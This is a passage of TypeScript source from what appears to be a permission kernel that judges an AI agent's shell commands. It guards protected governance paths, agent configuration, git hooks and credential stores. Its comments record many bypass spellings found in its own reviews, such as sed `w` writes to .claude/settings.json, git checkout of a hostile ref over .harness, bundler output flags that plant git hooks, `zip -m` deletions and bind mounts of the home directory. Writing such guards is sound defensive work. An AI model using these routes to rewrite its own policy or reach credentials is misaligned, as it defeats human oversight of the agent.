      if (/^\d*[<>]|^&[<>]|^[<>]/.test(t)) {
        if (!t.includes('/') && i + 1 < tokens.length) i++;
        continue;
      }
      ops.push(t);
    }
    if (targetDir !== null && ops.length >= 1) {
      const linkDir = isAbsolute(targetDir) ? targetDir : resolve(cwd, targetDir);
      for (const src of ops) {
        const expanded = expandHome(src, cwd);
        if (expanded === null || /[$`*?]/.test(expanded)) continue;
        const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(linkDir, expanded));
        const entry = paths.find((q) => q.raw === src);
        if (entry) entry.abs = abs;
        else paths.push({ raw: src, abs, glob: false });
      }
    } else if (ops.length >= 2) {
      // ...AND WHEN THE LAST OPERAND IS AN EXISTING DIRECTORY, ln puts the link INSIDE it — its second
      // documented form, on BSD and GNU alike. `ln -s ../.harness k` with `k` a directory creates
      // `k/.harness -> ../.harness`, which is the same writable route into the governance tree this rule was
      // written to close, one spelling over (self-attack on exit review 9).
      const last = ops[ops.length - 1]!;
      const lastAbs = isAbsolute(last) ? last : resolve(cwd, last);
      const linkDir = directoryExists(lastAbs) ? lastAbs : dirname(lastAbs);
      for (const src of ops.slice(0, -1)) {
        const expanded = expandHome(src, cwd);
        if (expanded === null || /[$`*?]/.test(expanded)) continue;
        const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(linkDir, expanded));
        // the path entry is REPLACED rather than judged separately, so the protected-tree reasoning that already
        // knows "a link to a directory that CONTAINS protected paths opens a route into them" applies unchanged
        const entry = paths.find((q) => q.raw === src);
        if (entry) entry.abs = abs;
        else paths.push({ raw: src, abs, glob: false });
        // ...AND THE JUDGEMENT IS MADE HERE TOO, not only through the shared path list. A link is a SECOND NAME
        // for its target, so a link to a directory that CONTAINS protected paths opens a writable route into
        // them — and routing that through the shared list made it depend on conditions further down that a
        // producer body does not always meet (the corpus found `npm run` carrying it reaching ALLOW while the
        // identical command alone was DENY).
        const linkRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
          canonicalPath(r).split(sep).join('/'),
        );
        const linkPosix = abs.split(sep).join('/');
        for (const pp of table.protectedPaths) {
          if (pp.tool === 'Read') continue;
          const prefix = pp.path
            .replace(/^\*\*\//, '')
            .replace(/^~\//, homedir() + '/')
            .split(/[*?[{]/)[0]!
            .replace(/\/$/, '');
          const candidates = (isAbsolute(prefix) ? [prefix] : linkRoots.map((r: string) => `${r}/${prefix}`)).map(
            foldName,
          );
          const here = foldName(linkPosix);
          if (!candidates.some((c) => c === here || c.startsWith(here + '/'))) continue;
          hits.push({
            capability: pp.capability,
            verdict: verdictFor(table, ctx, pp.capability),
            via: `symlink ${ops[ops.length - 1]} points at ${src}, which is or contains protected ${pp.path}`,
            segment: seg,
            absolute: isAbsoluteCap(table, pp.capability),
          });
          break;
        }
      }
    }
  }
  // CARGO'S CONFIGURATION NAMES PROGRAMS. `[build] rustc-wrapper`, `linker`, `runner` and `credential-process` in
  // `.cargo/config.toml` make cargo execute a program of the repository's choosing for every crate it compiles —
  // the identical setting as a flag or an environment variable was already gated, and the FILE that sets it was
  // not, which is exactly the shape of the `.npmrc` `script-shell` defect phase 1 closed for node (exit review
  // 10). Cargo reads the file from the package directory UPWARDS, and `--config PATH` names another one to merge
  // in; both are read here, and a file that cannot be read is opacity rather than an absence.
  if (head === 'cargo') {
    const cfgFiles: string[] = [];
    for (const n of ['.cargo/config.toml', '.cargo/config']) {
      const f = findUp(ctx, cwd, n);
      if (f !== null && f !== SEARCH_EXHAUSTED) cfgFiles.push(f);
    }
    for (let i = 1; i < tokens.length; i++) {
      const v = tokens[i] === '--config' ? tokens[i + 1] : tokens[i]!.startsWith('--config=') ? tokens[i]!.slice(9) : undefined;
      // KEY=VALUE overrides are judged by the text matcher; a bare PATH is a file to merge
      if (v !== undefined && !v.includes('=') && !/[$`*?]/.test(v)) cfgFiles.push(isAbsolute(v) ? v : resolve(cwd, v));
    }
    for (const f of cfgFiles) {
      const text = readInsideWorkspace(ctx, f);
      const names =
        text === null
          ? 'a configuration file this kernel could not read'
          : /^\s*(rustc-wrapper|rustc-workspace-wrapper|linker|runner|credential-process|rustc|rustdoc)\s*=/m.exec(text)?.[1] ??
            (/^\s*(rustflags|rustdocflags)\s*=[^\n]*(linker|link-arg|plugin|-Z)/m.test(text) ? 'a rustflags entry that names a program' : null);
      if (names !== null)
        hits.push({
          capability: 'command.script-opaque',
          verdict: verdictFor(table, ctx, 'command.script-opaque'),
          via: `cargo configuration ${f.slice(f.lastIndexOf('/') + 1)} sets ${names}, which names a program cargo will run`,
          segment: seg,
          absolute: false,
          opaqueUnread: true,
        });
    }
  }
  // A RESPONSE FILE IS A COMMAND LINE: its words are spliced into argv before the tool parses anything
  if (RESPONSE_FILE_TOOLS.test(head))
    for (const t of tokens.slice(1)) {
      if (!t.startsWith('@') || t.length < 2 || /[$`*?]/.test(t)) continue;
      const rf = t.slice(1);
      const text = readInsideWorkspace(ctx, isAbsolute(rf) ? rf : resolve(cwd, rf));
      if (text === null) {
        hits.push({
          capability: 'command.script-opaque',
          verdict: verdictFor(table, ctx, 'command.script-opaque'),
          via: `the response file ${rf} supplies options this kernel has not read`,
          segment: seg,
          absolute: false,
          opaqueUnread: true,
        });
        continue;
      }
      const spliced = `${head} ${text.split(/\r?\n/).join(' ')}`;
      const prog =
        (PROGRAM_OPERAND_TOOL_RE.test(spliced) ? PROGRAM_OPERAND_RE : PROGRAM_OPERAND_LONG_RE).exec(spliced) ??
        PROGRAM_OPERAND_GLUED_RE.exec(spliced);
      if (prog)
        hits.push({
          capability: 'command.script-opaque',
          verdict: verdictFor(table, ctx, 'command.script-opaque'),
          via: `the response file ${rf} supplies ${prog[1] ?? prog[0]}, which names a program the command class does not bound`,
          segment: seg,
          absolute: false,
          opaqueUnread: true,
        });
    }
  // A SED SCRIPT'S OWN `w FILE` IS A WRITE TO THAT FILE, and only to that file. `sed -n '1w
  // .claude/settings.json' README.md` replaces the agent's configuration while READING README.md, so the
  // destination is judged here, on its own, rather than through the coarse "every operand is a write" switch —
  // which would have made reading a governed file a write and reintroduced the defect closed one commit ago.
  for (const w of sedWrittenFiles(rawSeg, ctx, cwd)) {
    // a device sink is a DISCARD, exactly as it is for `> /dev/null` (self-attack on exit review 9)
    if (/[$`]/.test(w) || isDeviceDiscard(w)) continue;
    const abs = canonicalPath(isAbsolute(w) ? w : resolve(cwd, w));
    const h = classifyPath(table, ctx, 'Write', abs);
    if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `sed writes ${w} (${h.via})`, segment: seg });
  }
  // EVERY RUNTIME THE MODEL KNOWS, not two of them. The privileged-mount MATCHER already named nerdctl, so the
  // command was recognised as a bind mount of `/` and asked — while the identical docker line was denied,
  // because only docker and podman reached the resolver that judges the SOURCE path (exit review 8). A tool the
  // matchers name and the analyzer does not is a hole with a sign on it.
  if (/^(docker|podman|nerdctl)$/.test(head)) {
    for (const src of containerMountSources(tokenize(seg))) {
      const expanded = expandHome(src) ?? src;
      if (/[$`]/.test(expanded)) {
        hits.push({
          capability: 'command.unknown',
          verdict: verdictFor(table, ctx, 'command.unknown'),
          via: `bind mount source ${src} cannot be resolved`,
          segment: seg,
          absolute: false,
        });
        continue;
      }
      const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded));
      // a bind mount is read-write by default: judge it as BOTH, and keep whichever is more restrictive
      for (const tool of ['Write', 'Read'] as const) {
        const h = classifyPath(table, ctx, tool, abs);
        if (h.verdict !== 'ALLOW')
          hits.push({ ...h, via: `bind mount source ${src} (${h.via})`, segment: seg });
      }
      const posix = abs.split(sep).join('/');
      const homePosix = canonicalPath(homedir()).split(sep).join('/');
      if (posix === homePosix || homePosix.startsWith(posix + '/') || posix === '/')
        hits.push({
          capability: 'fs.credential-store.read',
          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
          via: `bind mount of ${src} hands the container every credential store under it`,
          segment: seg,
          absolute: false,
        });
    }
  }
  const home = canonicalPath(homedir()).split(sep).join('/');
  const recursive =
    RECURSIVE_HEADS.has(head) &&
    ([
      'find',
      'fd',
      'fdfind',
      'tar',
      'zip',
      'rsync',
      'du',
      'tree',
      'rg',
      'ag',
      'ack',
      'restic',
      'borg',
    ].includes(head) ||
      tokens.some((t) => RECURSIVE_FLAG_RE.test(t)));
  // A BUILD TOOL'S OUTPUT FLAG IS A DESTINATION, whatever the tool. Only `-o/--output/--output-file/--out-file`
  // were read, so every bundler's own spelling wrote wherever it liked: `esbuild --outfile=.git/hooks/pre-commit`
  // installed a hook, `rollup --file .mcp.json` rewrote the agent's own configuration, `vite --outDir
  // .harness/runtime` wrote runtime state, `webpack --output-path control-plane/permissions` rewrote the policy,
  // and `docker buildx build --output type=local,dest=…` wrote anywhere on the host — all at ALLOW, while the
  // same bytes through `cp` or `>` were absolute denies (exit review 7).
  // EVERY FLAG THAT NAMES A FILE THE TOOL WRITES. Exit review 7 stated the rule — the flag names the file
  // whatever the tool is called — and then expressed it as an ENUMERATION, which is a list that is wrong by
  // omission: `tsc --tsBuildInfoFile .git/hooks/pre-commit` installs a git hook and
  // `esbuild --metafile=.harness/runtime/state.json` rewrites runtime state, both at ALLOW (exit review 10).
  const OUTPUT_FLAGS = [
    '--output', '--output-file', '--out-file', '--outfile', '--out-dir', '--outdir', '--outDir', '--output-dir',
    '--output-directory', '--output-path', '--dist-dir', '--file', '--dest', '--destination', '--emit-to', '--out',
    '--tsBuildInfoFile', '--metafile', '--stats-json', '--report', '--report-file', '--coverage-directory',
    '--emit-decorator-metadata-to', '--declarationDir', '--declaration-dir', '--sourcemap-file', '--manifest',
    '--lockfile-path', '--cache-location', '--cacheLocation', '--output-document', '--write-to', '--save-to',
    '--log-file', '--result-file', '--junit', '--junit-xml', '--tap-file', '--profile-output',
  ];
  // ...AND EVERY ONE OF THEM, not the last. A command may name two destinations — `esbuild --metafile=A
  // --outfile=B` — and taking only the last judged B while A was the governed file (exit review 10).
  // `-o` IS NOT AN OUTPUT FLAG FOR EVERY TOOL: `ls -o` is long format without the group, `grep -o` prints only the
  // matching part, `make -o FILE` marks a file as very old and `ssh -o` sets an option. Read as a destination, the
  // NEXT WORD became a write target - `grep -rno .harness/runtime docs` searched for the pattern and was refused as
  // a write to the runtime directory (exit review 10). Only the long spellings count for these.
  const shortO = /^(ls|grep|egrep|fgrep|zgrep|rg|ag|ack|make|gmake|ps|ssh|scp|sftp|nm|lsof|column|mount|sudo|find)$/.test(head) ? '' : 'o';
  for (const extra of optionValues(tokenize(seg), shortO, OUTPUT_FLAGS)) {
    if (!extra || extra.startsWith('-') || /[$`]/.test(extra)) continue;
    const eAbs = canonicalPath(isAbsolute(extra) ? extra : resolve(cwd, extra));
    const h = classifyPath(table, ctx, 'Write', eAbs);
    if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `output flag names ${extra} (${h.via})`, segment: seg });
  }
  const rawOutput =
    optionValue(tokenize(seg), shortO, OUTPUT_FLAGS) ??
    optionValue(
      tokenize(seg).map((t) => t.replace(/^(--[A-Za-z][A-Za-z-]*)(?==|$)/, (f) => f.toLowerCase())),
      shortO,
      OUTPUT_FLAGS.map((f) => f.toLowerCase()),
    );
  // buildx spells its destination as a CSV of key=value inside the flag's own value: `--output type=local,dest=P`
  const genericOutput =
    rawOutput !== null && /(?:^|,)dest=/.test(rawOutput)
      ? (/(?:^|,)dest=([^,\s]+)/.exec(rawOutput)?.[1] ?? null)
      : (rawOutput ?? (/(?:^|[\s,])dest=([^,\s]+)/.exec(seg)?.[1] ?? null));
  const write =
    WRITE_HEADS.has(head) ||
    // an EXPLICIT output flag names a destination whatever the value looks like: `--outDir control-plane` has
    // neither a slash nor a dot in it, and the `/[/.]/` shape test below rejected it (exit review 8)
    (rawOutput !== null && rawOutput !== '' && !/^-/.test(rawOutput)) ||
    // an in-place formatter rewrites the files it is given
    // AN IN-PLACE FORMATTER IS NAMED BY ITS FLAG, not by a list of heads: `npx prettier --write <path>` and
    // `eslint --fix <path>` rewrite exactly what they are given, and neither was in the list (exit review 10).
    (/^(shfmt|gofmt|rustfmt|clang-format|black|isort|yapf|prettier|eslint|biome|oxlint|dprint|ruff|stylelint|swiftformat|ktlint|php-cs-fixer|rubocop|standardrb|terraform|tofu|taplo|yamlfmt|buf|deno)$/.test(head) &&
      tokens.some((t) => /^(-w|--write|-i|--in-place|--fix|--fix-dry-run|-f)$/.test(t))) ||
    // ...and so does a stream editor, but ONLY with its in-place flag: without it the same tool is a reader —
    // unless its own SCRIPT names a file to write, which `w FILE` does (exit review 9)
    (/^(sed|gsed|perl|ruby|gawk|awk|mawk|nawk)$/.test(head) &&
      (editsInPlace(head, tokens) || sedWrittenFiles(rawSeg, ctx, cwd).length > 0)) ||
    (head === 'git' && /^(checkout|restore|clone|revert|cherry-pick|rm|mv|merge-file)$/.test(tokens[1] ?? '')) ||
    (genericOutput !== null && /[/.]/.test(genericOutput));
  // destination of a write-ish command: last operand for cp/mv/ln/install/rsync, -C/-d dir for archives, of= for dd
  let dest: string | null = null;
  let gitPathspecs: string[] = [];
  if (write) {
    const bareOperands = (valueOpts?: RegExp): string[] => {
      // ignore redirections (`< list`, `2> err`) and their targets, then keep the bare operands even when a
      // destination is a bare name (`cd .harness/generated && cp x policy.json`)
      const operands: string[] = [];
      for (let i = 1; i < tokens.length; i++) {
        const t = tokens[i]!;
        if (/^\d*[<>]{1,2}$/.test(t) || t === '&>' || t === '>|') {
          if (!t.includes('/') && i + 1 < tokens.length) i++;
          continue;
        }
        // an option that consumes the next token must not let its VALUE pass as an operand: a trailing
        // `--sparse always` would otherwise displace the real destination (round 13)
        if (valueOpts?.test(t)) {
          i++;
          continue;
        }
        if (!t.startsWith('-')) operands.push(t);
      }
      return operands;
    };
    // `cp -l` MAKES A HARD LINK: a second name for the same inode, through which a governed file is writable by a
    // path no rule covers. `cp -l control-plane/permissions/absolute-denies.md /tmp/alias` is the same act as
    // `ln <same> /tmp/alias`, which is DENY, so both operands are judged (exit review 7).
    if (/^(shfmt|gofmt|rustfmt|clang-format|black|isort|yapf|prettier|eslint|biome|oxlint|dprint|ruff|stylelint|swiftformat|ktlint|php-cs-fixer|rubocop|standardrb|taplo|yamlfmt)$/.test(head) &&
      tokens.some((t) => /^(-w|--write|-i|--in-place|--fix|--fix-dry-run)$/.test(t))) dest = 'ALL';
    else if (head === 'cp' && tokens.some((t) => /^-[a-zA-Z]*l/.test(t))) dest = 'ALL';
    else if (head === 'tar' || head === 'bsdtar' || head === 'gtar') {
      // traditional tar also takes a DASH-LESS function-letter operand as its first argument: `tar xf a`, `tar cf a`,
      // `tar czf a` — recognise it alongside the dashed `-cf`/`-xf` forms
      const modeTok = tokens[1] && !tokens[1].startsWith('-') && /^[a-z]+$/i.test(tokens[1]) ? tokens[1] : '';
      const letters = tarFunctionLetters(tokens);
      // every archive-WRITING mode: create (c), append (r), update (u), catenate (A) — not just create
      const writeMode =
        tokens.some(
          (t) =>
            t === '--create' ||
            t === '--append' ||
            t === '--update' ||
            t === '--catenate' ||
            t === '--concatenate',
        ) || /[cruA]/.test(letters);
      const extract =
        tokens.some((t) => t === '--extract' || t === '--get') || /x/.test(letters);
      if (writeMode) {
        // dash-less `cf`/`czf`/`rf`/`cbf`: the archive is `f`'s positional argument. Function letters before `f` that
        // themselves consume an argument (b blocking-factor, V volume, L length, N newer, X exclude, T files-from)
        // shift it, so `tar cbf 20 ARCHIVE` has its archive at tokens[3], not tokens[2].
        let arc = archiveFileOperand(tokens);
        if (!arc && modeTok && /f/.test(modeTok)) {
          const argLetters = new Set(['f', 'b', 'V', 'L', 'N', 'X', 'T']);
          let before = 0;
          for (const ch of modeTok) {
            if (ch === 'f') break;
            if (argLetters.has(ch)) before++;
          }
          arc = tokens[2 + before] ?? null;
        }
        dest = arc && arc !== '-' ? arc : null; // writing the archive is a write to that path
      } else if (extract) {
        // the change-directory flag has several spellings: -C DIR, -CDIR, -xCDIR, --directory DIR, --directory=DIR,
        // --cd DIR, and --one-top-level[=DIR] creates and extracts into its own directory
        // SUCCESSIVE `-C` ARE CUMULATIVE. tar enters each in turn, so `-C .harness -C runtime` extracts into
        // `.harness/runtime`; taking only the LAST one read it as `runtime` relative to the working directory,
        // which is a different place entirely and not a protected one (exit review 9).
        const cds = optionValues(tokens, 'C', ['--directory', '--cd']);
        const top = optionValue(tokens, '', ['--one-top-level']);
        dest = top ?? (cds.length ? cds.reduce((acc, d) => (isAbsolute(d) ? d : `${acc}/${d}`)) : '.');
      } else dest = null; // list / compare: read-only
    } else if (head === 'ar') {
      // `ar` WRITES ITS ARCHIVE, and the archive is the first operand after the key letters. `ar rcS
      // .harness/runtime/state.json payload/blob` replaces a runtime file EGO alone may write, under a name
      // that looks like a build step (exit review 9). The modes that only READ are `t` (list) and `p` (print).
      const ops = bareOperands();
      const keys = ops[0] ?? '';
      // `t` lists and `p` prints — both read. `x` EXTRACTS, which writes the members into the working
      // directory and leaves the archive untouched (self-attack on exit review 9).
      dest = /^[a-zA-Z]+$/.test(keys)
        ? /^[tp]/.test(keys)
          ? null
          : /^x/.test(keys)
            ? '.'
            : (ops[1] ?? null)
        : null;
      // the dashed spelling puts the key letters in an option: `ar -r -c archive member`. `d` DELETES members
      // and `s` rewrites the index, so both write the archive exactly as `r`, `q` and `m` do (self-attack).
      if (dest === null && tokens.some((t) => /^-[a-zA-Z]*[rqmds]/.test(t))) dest = ops[0] ?? null;
    } else if (head === 'zip') {
      const operands = bareOperands();
      // `zip -m` MOVES: it deletes every source file once it has added it, so `zip -rm /tmp/x.zip .` empties the
      // working tree exactly as `rm -rf .` does. Only the ARCHIVE was judged, so the deletion was invisible and
      // the act arrived as the approvable `command.destructive` (exit review 8).
      if (tokens.some((t) => t === '--move' || /^-[a-zA-Z]*m/.test(t))) dest = 'ALL';
      else dest = operands.length ? operands[0]! : null; // zip writes its archive: the first non-option operand
    } else if (head === 'unzip') {
      dest = optionValue(tokens, 'd', ['--exdir']) ?? '.';
    } else if (head === 'find') {
      // find's own write actions: -fprint/-fprint0/-fls FILE and -fprintf FILE FORMAT
      const i = tokens.findIndex((t) => t === '-fprint' || t === '-fprint0' || t === '-fls' || t === '-fprintf');
      dest = i >= 0 ? (tokens[i + 1] ?? null) : null;
    } else if (head === 'dd') dest = tokens.find((t) => t.startsWith('of='))?.slice(3) ?? null;
    else if (head === 'pax') {
      const wmode = tokens.some((t) => t === '-w' || /^-[A-Za-z]*w/.test(t)); // -w, -rw, -wf all write
      const arc = archiveFileOperand(tokens);
      if (wmode && arc) dest = arc !== '-' ? arc : null; // `pax -w -f ARCHIVE`: writes the archive
      else {
        const operands = bareOperands();
        // `pax -r -w SRC... DEST` copies into the last operand; `-r` alone (extract) has no path destination here
        dest = wmode && operands.length ? operands[operands.length - 1]! : null;
      }
    } else if (head === 'mv' || head === 'rename') {
      // mv/rename remove the source AND create the destination: every operand is a write (moving `.harness` away,
      // renaming a protected file over another) — the source side is not merely a read
      dest = 'ALL';
    } else if (head === 'sort') {
      // `sort -o FILE` / `sort -oFILE` / `sort --output=FILE` writes FILE (in place, even when FILE is an input too)
      dest = optionValue(tokens, 'o', ['--output']);
    } else if (head === 'uniq') {
      // `uniq [input [output]]`: a second bare operand is the output file
      const operands = bareOperands();
      dest = operands.length >= 2 ? operands[operands.length - 1]! : null;
    } else if (head === 'yq') {
      // `yq -i/--inplace … FILE` edits FILE in place
      const inplace = tokens.some((t) => t === '-i' || t === '--inplace' || /^-[a-zA-Z]*i$/.test(t));
      const operands = bareOperands();
      dest = inplace && operands.length ? operands[operands.length - 1]! : null;
    } else if (head === 'rsync' && tokens.some((t) => t === '--dry-run' || /^-[a-zA-Z]*n[a-zA-Z]*$/.test(t))) {
      // `rsync -n` (`--dry-run`) lists what WOULD be transferred and writes nothing
      dest = null;
    } else if (['cp', 'install', 'rsync', 'scp', 'gcp', 'gmv', 'ditto', 'cpio'].includes(head)) {
      const operands = bareOperands(copyValueOpts(head));
      // `-t DIR` / `--target-directory=DIR` moves the destination off the operand list entirely: every operand is
      // then a source and DIR is what gets written (round 13)
      const targetDir = optionValue(
        tokens,
        ['cp', 'install', 'mv', 'gcp', 'gmv'].includes(head) ? 't' : '',
        ['--target-directory'],
      );
      // cpio -p reads its file list from stdin and copies INTO its sole operand; cp/rsync/... write the last operand
      dest = targetDir
        ? targetDir
        : operands.length
          ? head === 'cpio'
            ? operands[0]!
            : operands[operands.length - 1]!
          : null;
    } else if (head === 'git') {
      // `git checkout|restore <ref> -- <paths>` writes the paths — AND SO DOES THE SPELLING WITHOUT `--`, which
      // git documents as optional. `git checkout HEAD~1 control-plane/permissions/matchers.md` rewrote the policy
      // that decides every later verdict and `git checkout origin/evil .harness` replaced the whole governance
      // tree, both at ALLOW, while adding two characters made each an absolute deny (exit review 7). Without the
      // disambiguator the first operand may be a TREE-ISH; a bare name with no `/` or `.` is read as one, and
      // everything after it is a pathspec.
      const sub = tokens[1];
      const dd = tokens.indexOf('--');
      // `git rm` DELETES the files it names, and the matcher that classifies it is an ALLOW capability. Its
      // pathspecs were never judged, so `git rm -r control-plane` removed the policy that decides every later
      // verdict (exit review 8). Same shape as checkout's pathspecs, minus the tree-ish.
      // THE PATHSPECS MAY BE IN A FILE. `--pathspec-from-file=paths.txt` is git's own way of naming more paths
      // than a command line holds, and every verb that takes pathspecs accepts it. None of them read it, so
      // `git checkout HEAD~1 --pathspec-from-file=paths.txt` replaced the policy the file names while the
      // identical command with that path spelled out was an absolute deny (exit review 8). The file is read only
      // from inside the workspace; `-` is standard input, which cannot be read at all and is reported as the
      // opacity it is.
      const fromFile = optionValue(tokens, '', ['--pathspec-from-file']);
      const fileSpecs: string[] = [];
      let pathspecFileUnread: string | null = null;
      if (fromFile !== null) {
        if (fromFile === '-') pathspecFileUnread = 'standard input';
        else {
          const text = readInsideWorkspace(ctx, isAbsolute(fromFile) ? fromFile : resolve(cwd, fromFile));
          if (text === null) pathspecFileUnread = fromFile;
          // `--pathspec-file-nul` separates with NUL instead of newlines
          else fileSpecs.push(...text.split(/\0|\r?\n/).map((l) => l.trim()).filter(Boolean));
        }
      }
      if (pathspecFileUnread !== null)
        hits.push({
          capability: 'command.script-opaque',
          verdict: verdictFor(table, ctx, 'command.script-opaque'),
          via: `the pathspecs come from ${pathspecFileUnread}, which this kernel has not read`,
          segment: seg,
          absolute: false,
          opaqueUnread: true,
        });
      // `git merge-file A B C` WRITES A IN PLACE — it is plumbing, not the porcelain merge, and `^git\s+merge\b`
      // matched it because `\b` sits between "merge" and "-" (exit review 10). `-p`/`--stdout` prints instead.
      if (sub === 'merge-file') {
        const specs = tokens.slice(2).filter((t) => !t.startsWith('-'));
        dest = specs.length && !tokens.some((t) => /^(-p|--stdout)$/.test(t)) ? specs[0]! : null;
      } else if (sub === 'rm' || sub === 'mv') {
        // `git rm -n` and `git mv -n` (`--dry-run`) SHOW what would be removed or moved and touch nothing
        const dryRunGit = tokens.slice(2).some((t) => t === '--dry-run' || /^-[a-zA-Z]*n[a-zA-Z]*$/.test(t));
        const specs = dryRunGit ? [] : [...tokens.slice(2).filter((t) => !t.startsWith('-')), ...fileSpecs];
        if (specs.length) {
          gitPathspecs = specs;
          dest = 'ALL_PATHSPECS';
        } else dest = null;
      } else if ((sub === 'checkout' || sub === 'restore') && fileSpecs.length) {
        gitPathspecs = fileSpecs;
        dest = 'ALL_PATHSPECS';
      } else if ((sub === 'checkout' || sub === 'restore') && dd > 0) dest = 'AFTER_DASHDASH';
      else if (sub === 'checkout' || sub === 'restore') {
        const rest = tokens.slice(2).filter((t) => !t.startsWith('-'));
        const specs = rest.length > 1 && !/[/.]/.test(rest[0] ?? '') ? rest.slice(1) : rest;
        // `-b`/`-B`/`-t` name a BRANCH, not a path, and those spellings create nothing in the working tree
        // every pathspec is a destination, so the whole list is judged rather than only the first
        dest = specs.length && !tokens.some((t) => /^-[a-zA-Z]*[bB]$/.test(t)) ? 'ALL_PATHSPECS' : null;
        if (dest) gitPathspecs = specs;
      } else if (sub === 'clone') {
        // `git clone URL DIR` creates DIR from a remote tree: `git clone … node_modules/.bin` replaces the
        // directory every locally installed binary is resolved from
        const rest = tokens.slice(2).filter((t) => !t.startsWith('-'));
        dest = rest.length > 1 ? (rest[rest.length - 1] ?? null) : null;
      } else if (/^(revert|cherry-pick)$/.test(sub ?? '')) {
        // A REVERT REWRITES WHATEVER THE NAMED COMMIT TOUCHED — a set the command line does not enumerate, but
        // one git will tell us. Resolving it beats both blanket answers: DENY made an everyday act an absolute
        // deny in any governed repository, and ALLOW let `git revert <the commit that hardened the control
        // plane>` undo a matcher with no human involved (exit review 7). What the commit touched is judged as
        // the write it is; a commit-ish this kernel cannot resolve stays the destructive class it already has.
        const revs = tokens.slice(2).filter((t) => !t.startsWith('-'));
        const touched: string[] = [];
        for (const rev of revs.slice(0, 4)) {
          if (!/^[A-Za-z0-9_./^~@{}-]+$/.test(rev)) continue;
          const show = git(['show', '--name-only', '--pretty=format:', rev], cwd);
          if (show.ok) touched.push(...show.stdout.split(/\r?\n/).map((l) => l.trim()).filter(Boolean));
        }
        if (touched.length) {
          gitPathspecs = [...new Set(touched)];
          dest = 'ALL_PATHSPECS';
        } else dest = null;
      } else dest = null;
    } else if (head === 'patch') {
      // `patch --dry-run` (and `--check`) reports whether the patch applies and modifies nothing
      // `patch -o FILE` / `patch -oFILE` / `patch --output=FILE` writes FILE instead of the patched originals
      dest = tokens.some((t) => t === '--dry-run' || t === '--check') ? null : (optionValue(tokens, 'o', ['--output']) ?? 'ALL');
    } else if (/^(sed|gsed|perl|ruby|gawk|awk|mawk|nawk)$/.test(head)) {
      // A STREAM EDITOR WRITES ITS OPERANDS ONLY IN PLACE. Unconditionally it made every READ of a governed file
      // an absolute deny; never, it let `gawk -i inplace '{print "x"}' .claude/settings.json` rewrite one
      // (exit review 8).
      dest = editsInPlace(head, tokens) ? 'ALL' : null;
      // ...and a sed script's own `w FILE` writes wherever it says, whatever the operands are (exit review 9)
      for (const w of sedWrittenFiles(rawSeg, ctx, cwd))
        if (!paths.some((q) => q.raw === w) && !/[$`]/.test(w)) {
          const glob = /[*?[{]/.test(w);
          const literal = glob ? w.slice(0, w.search(/[*?[{]/)) : w;
          paths.push({ raw: w, abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)), glob });
          if (dest === null) dest = 'ALL';
        }
    } else if (
      [
        'tee',
        'truncate',
        'touch',
        'chmod',
        'chown',
        'rm',
        'mkdir',
        'rmdir',
        'ln',
        'shred',
        'unlink',
        'rename',
        'patch',
      ].includes(head) ||
      // `cp -l` makes a HARD LINK: a second name for the same inode, through which a governed file is writable
      // by a path no rule covers (exit review 7)
      (head === 'cp' && tokens.some((t) => /^-[a-zA-Z]*l/.test(t)))
    )
      // for ln (and `cp -l`, which makes the same second name for the same inode) EVERY operand counts: a link
      // target inside a protected tree opens a route into it, and a link SOURCE inside one opens a route out
      dest = 'ALL';
  }
  // a generic `-o FILE` / `--output FILE` names a write destination whatever the tool is called; enumerating every
  // "read-only" tool that happens to accept one is the losing game (round 15)
  // ...and an EXPLICIT output flag names a destination whatever the value looks like: `--outDir control-plane`
  // has neither a slash nor a dot, and this shape test rejected it (exit review 8)
  if (!dest && genericOutput && !/^-/.test(genericOutput)) dest = genericOutput;
  if (dest === 'ALL_PATHSPECS') {
    const psRoot = repoRootFor(ctx, cwd);
    for (const rawSpec of gitPathspecs) {
      // a pathspec may carry MAGIC: `:/x` and `:(top)x` are repo-root-relative, `:!x` and `:(exclude)x` exclude
      const sp = pathspecPath(rawSpec, psRoot === null ? null : psRoot.split(sep).join('/'));
      if (sp === null) continue;
      if (paths.some((q) => q.raw === sp)) continue;
      const expanded = expandHome(sp, cwd);
      if (expanded === null || /[$`]/.test(expanded)) paths.push({ raw: sp, abs: null, glob: false });
      else {
        const glob = /[*?[{]/.test(expanded);
        const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
        paths.push({
          raw: sp,
          abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)),
          glob,
        });
      }
    }
    dest = 'ALL';
  }
  if (dest && dest !== 'ALL' && dest !== 'AFTER_DASHDASH' && !paths.some((p) => p.raw === dest)) {
    const expanded = expandHome(dest, cwd);
    if (expanded === null || /[$`]/.test(expanded)) paths.push({ raw: dest, abs: null, glob: false });
    else {
      const glob = /[*?[{]/.test(expanded);
      const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
      paths.push({
        raw: dest,
        abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)),
        glob,
      });
    }
  }
  if (dest === 'ALL') {
    for (const t of tokens.slice(1)) {
      if (t.startsWith('-') || paths.some((p) => p.raw === t) || /^[sy]\/|^\d+$/.test(t)) continue;
      const expanded = expandHome(t, cwd);
      if (expanded === null || /[$`]/.test(expanded)) continue;
      paths.push({
        raw: t,
        abs: canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded)),
        glob: /[*?[{]/.test(expanded),
      });
    }
  }
  if (dest === 'AFTER_DASHDASH') {
    for (const t of tokens.slice(tokens.indexOf('--') + 1)) {
      const expanded = expandHome(t, cwd);
      if (expanded === null || /[$`]/.test(expanded)) continue;
      paths.push({
        raw: t,
        abs: canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded)),
        glob: false,
      });
    }
  }
  // an implicit destination (archive extracted into the working directory) is a path the command never spells out
  if (dest === '.' && !paths.some((p) => p.raw === '.'))
    paths.push({ raw: '.', abs: canonicalPath(cwd), glob: false });
  // a recursive read names its roots as bare operands too (`cd / && grep -r KEY Users`): an operand that is HOME or one of
  // its ancestors reaches the credential stores
  if (recursive) {
